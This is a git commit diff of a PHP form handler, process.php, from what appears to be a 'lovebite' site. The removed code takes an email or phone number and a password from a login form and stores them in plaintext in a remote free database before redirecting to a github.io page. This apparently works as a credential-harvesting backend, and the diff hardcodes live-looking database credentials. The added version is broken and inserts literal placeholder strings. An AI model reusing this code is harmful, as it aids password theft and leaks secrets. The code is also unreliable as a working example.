b4f55236f921a28b725eb43e473ae1614c87186a
love-ai <125962648+love-ai@users.noreply.github.com>
2023-02-21 20:34:08 +0600

    Update process.php

--- process.php
+++ process.php
@@ -1,25 +1,30 @@
 <?php
-// get the post records
-$db_name = $db_info;
-$email_phone = $_POST['email_phone']; 
-$password = $_POST['password'];
+// Define database connection variables
+$servername = "http://sql12.freesqldatabase.com/"; // Replace with your own database host name
+$username = "sql12599952"; // Replace with your own database username
+$password = "zttT6GSgwr"; // Replace with your own database password
+$dbname = "sql12599952"; // Replace with your own database name
 
-// database connection code
-$servername = "sql12.freesqldatabase.com";
-$username = "sql12599952"; // replace with your own username
-$password = "zttT6GSgwr"; // replace with your own password
-$dbname = "sql12599952";
+// Create database connection
+$conn = mysqli_connect($servername, $username, $password, $dbname);
 
-$conn = new mysqli($servername, $username, $password, $dbname);
-
-if ($conn->connect_error){
-  die('Connection Failed : '.$conn->connect_error);
-}else{
-   $stmt = $conn->prepare("INSERT INTO tbl_contact (Id, email_number, password) VALUES (0, ?, ?)");
-   $stmt->bind_param("ss", $email_phone, $password);
-   $stmt->execute();
-   header("Location: https://love-ai.github.io/lovebite/couple%20query.html");
-   $stmt->close();
-   $conn->close(); 
+// Check if connection is successful
+if (!$conn) {
+    die("Connection failed: " . mysqli_connect_error());
 }
+
+// Define SQL query to insert data into table
+$sql = "INSERT INTO info (Id, email_number, password) VALUES ('0', '?', '?')";
+
+// Execute SQL query
+if (mysqli_query($conn, $sql)) {
+  header("Location: https://love-ai.github.io/lovebite/couple%20query.html");
+  exit();
+  
+} else {
+    echo "Error: " . $sql . "<br>" . mysqli_error($conn);
+}
+
+// Close database connection
+mysqli_close($conn);
 ?>
